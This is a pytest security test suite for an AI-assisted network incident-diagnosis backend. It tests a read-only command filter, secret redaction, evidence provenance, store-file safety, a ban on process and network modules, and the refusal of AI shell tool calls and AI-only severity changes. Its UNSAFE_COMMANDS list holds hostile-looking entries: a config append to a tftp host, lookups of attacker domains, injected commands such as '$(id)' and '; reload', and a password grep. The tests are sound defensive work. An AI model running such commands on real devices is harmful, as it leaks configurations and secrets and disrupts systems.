import ast
import json
from datetime import datetime, timezone
from pathlib import Path

import pytest
from pydantic import ValidationError

from app.core.config import Settings
from app.engine import DiagnosisEngine, diagnose
from app.engine.executor import MAX_TOOL_CALLS, MAX_TOOL_REQUESTS
from app.engine.safety import is_read_only_command
from app.engine.schema import DraftCheck, NextCheck
from app.incidents import IncidentService, IncidentValidationError, JsonIncidentRepository, LifecycleStatus, UnauthorizedActionError
from app.incidents.models import Actor, OutstandingCheck
from app.security.provenance import provenance_issues
from app.security.secrets import contains_secret, redact
from verification.engine.helpers import ScriptedProvider, final, incident_request, tool_call
from verification.incidents.helpers import HUMAN, SYSTEM, SteppingClock, create, scenario_request

BACKEND = Path(__file__).resolve().parents[2]
UNSAFE_COMMANDS = [
    "show running-config", "show startup-config", "show tech-support", "show crypto key mypubkey rsa", "show logging | redirect flash:x",
    "show interfaces | append tftp://198.51.100.1/x", "show interfaces | tee out", "ping 8.8.8.8 repeat 5", "traceroute evil.com",
    "dig @1.1.1.1 attacker.com A", "show users; reload", "configure terminal", "show ip route * ", "journalctl -u named $(id)",
    "show logging > /tmp/x", "show run | include password", "keactrl stop", "rndc reload", "show running security-policy | section key",
]
SAFE_COMMANDS = [
    "show interfaces {interface}", "ping {peer_ip} source {interface} repeat 100", "dig @10.100.100.10 erp.corp.example.com A",
    'journalctl -u kea-dhcp4 --since "1 hour ago"', "show interfaces Gi0/0/0 | include CRC", "show log traffic action equal deny",
]


@pytest.mark.parametrize("command", UNSAFE_COMMANDS)
def test_unsafe_commands_are_rejected_everywhere(command: str) -> None:
    assert not is_read_only_command(command)
    with pytest.raises(ValidationError):
        NextCheck(device_id="SIN-RTR-01", command=command, purpose="p", expected_observation="e", reason="r")
    with pytest.raises(ValidationError):
        OutstandingCheck(device_id="SIN-RTR-01", command=command, purpose="p")
    assert DraftCheck(device_id="SIN-RTR-01", command=command, purpose="p", expected_observation="e", reason="r")


@pytest.mark.parametrize("command", SAFE_COMMANDS)
def test_legitimate_commands_are_accepted(command: str) -> None:
    assert is_read_only_command(command)


def test_secret_redaction_in_incident_records(tmp_path: Path) -> None:
    store = tmp_path / "store"
    service = IncidentService(JsonIncidentRepository(store), SteppingClock())
    request = scenario_request("WAN-FAILURE", description="Router enable password: Sup3rS3cret! and token=abcd1234efgh")
    incident = service.create_incident(request, HUMAN).incident
    content = (store / f"{incident.incident_id}.json").read_text(encoding="utf-8")
    assert "Sup3rS3cret" not in content and "abcd1234efgh" not in content and "[redacted]" in content
    updated = service.update_details(incident.incident_id, HUMAN, description="Rotated; old api_key=zzzzzzzzzzzz removed")
    assert "zzzzzzzzzzzz" not in updated.description
    assert redact("plain text") == "plain text" and not contains_secret("Shared secret mismatch on RADIUS")


def test_forged_evidence_is_rejected_by_provenance(tmp_path: Path) -> None:
    diagnosis = diagnose(incident_request("WAN-FAILURE"))
    assert provenance_issues(diagnosis) == []
    item = next(e for e in diagnosis.evidence if e.references)
    forged_item = item.model_copy(update={"references": [item.references[0].model_copy(update={"record_id": "EVT-99999"})]})
    forged = diagnosis.model_copy(update={"evidence": [forged_item if e is item else e for e in diagnosis.evidence]})
    assert any("EVT-99999" in issue for issue in provenance_issues(forged))
    phantom = diagnosis.model_copy(update={"fault": diagnosis.fault.model_copy(update={"supporting_evidence_ids": ["E999"]})})
    assert any("does not contain" in issue for issue in provenance_issues(phantom))
    service = IncidentService(JsonIncidentRepository(tmp_path / "s"), SteppingClock())
    incident = create(service)
    service.change_status(incident.incident_id, HUMAN, LifecycleStatus.ACKNOWLEDGED)
    with pytest.raises(IncidentValidationError, match="provenance"):
        service.associate_diagnosis(incident.incident_id, SYSTEM, forged)
    assert service.associate_diagnosis(incident.incident_id, SYSTEM, diagnosis).active_diagnosis_id


def test_symlinked_incident_outside_store_is_quarantined(tmp_path: Path) -> None:
    store = tmp_path / "store"
    service = IncidentService(JsonIncidentRepository(store), SteppingClock())
    incident = create(service)
    outside = tmp_path / "outside.json"
    outside.write_text((store / f"{incident.incident_id}.json").read_text(encoding="utf-8").replace(
        incident.incident_id, "INC-20260303-0009"), encoding="utf-8")
    (store / "INC-20260303-0009.json").symlink_to(outside)
    repository = JsonIncidentRepository(store)
    assert "INC-20260303-0009" not in repository.index and repository.problems["INC-20260303-0009"] == "unsafe_or_oversized_file"


def test_store_directory_is_private(tmp_path: Path) -> None:
    store = tmp_path / "private-store"
    JsonIncidentRepository(store)
    assert store.stat().st_mode & 0o077 == 0


@pytest.mark.parametrize("values", [{"ai_provider": "openai"}, {"ai_provider": "openai", "ai_model": "m"},
                                    {"ai_provider": "foundry", "ai_model": "m", "foundry_api_key": "k" * 20}])
def test_incomplete_production_ai_configuration_fails_fast(values: dict) -> None:
    with pytest.raises(ValidationError):
        Settings(_env_file=None, environment="production", **values)
    assert Settings(_env_file=None, environment="production").ai_provider == "disabled"


def test_application_source_has_no_process_network_or_dynamic_execution() -> None:
    forbidden_modules = {"subprocess", "socket", "pickle", "shelve", "ctypes", "multiprocessing", "ftplib", "telnetlib", "paramiko",
                         "requests", "httpx", "http.client"}
    model_clients = {"openai", "httpx2", "agent_framework.openai"}
    forbidden_builtins = {"eval", "exec", "compile", "__import__"}
    forbidden_os_calls = {("os", "system"), ("os", "popen"), ("os", "execv"), ("os", "spawnv")}
    for path in (BACKEND / "app").rglob("*.py"):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                assert not {alias.name for alias in node.names} & forbidden_modules, path
            if isinstance(node, ast.ImportFrom):
                assert node.module not in forbidden_modules, path
                if node.module == "urllib.request" or (node.module or "").startswith("urllib"):
                    assert path.name == "providers.py", path
            imported = ({alias.name for alias in node.names} if isinstance(node, ast.Import)
                        else {node.module or ""} if isinstance(node, ast.ImportFrom) else set())
            if imported & model_clients:
                assert path.relative_to(BACKEND).as_posix() == "app/agent/runtime.py" or \
                    (imported & model_clients) == {"openai"} and path.relative_to(BACKEND).as_posix() == "app/agent/session.py", path
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                assert node.func.id not in forbidden_builtins, (path, node.func.id)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and isinstance(node.func.value, ast.Name):
                assert (node.func.value.id, node.func.attr) not in forbidden_os_calls, (path, node.func.attr)


def test_execution_limits_and_fallback_remain() -> None:
    assert (MAX_TOOL_CALLS, MAX_TOOL_REQUESTS) == (10, 20)
    provider = ScriptedProvider([tool_call("run_shell", {"command": "id"}), tool_call("__import__", {}), final("not json")])
    diagnosis = DiagnosisEngine(provider).diagnose(incident_request("WAN-FAILURE"))
    assert [c.error_code for c in diagnosis.tool_calls] == ["UNKNOWN_TOOL", "UNKNOWN_TOOL"]
    assert diagnosis.method.value == "rule_based_fallback" and json.dumps(diagnosis.model_dump(mode="json"))
    assert diagnosis.incident.status.value == "failed"


def test_human_only_actions_remain_protected(tmp_path: Path) -> None:
    service = IncidentService(JsonIncidentRepository(tmp_path / "s"), SteppingClock(datetime(2026, 3, 3, 9, tzinfo=timezone.utc)))
    incident = create(service)
    for actor in (Actor(kind="ai", actor_id="assistant"), SYSTEM):
        for operation in (lambda a: service.change_severity(incident.incident_id, a, "low", "x"),
                          lambda a: service.reopen_incident(incident.incident_id, a, "x")):
            with pytest.raises(UnauthorizedActionError, match="may not"):
                operation(actor)
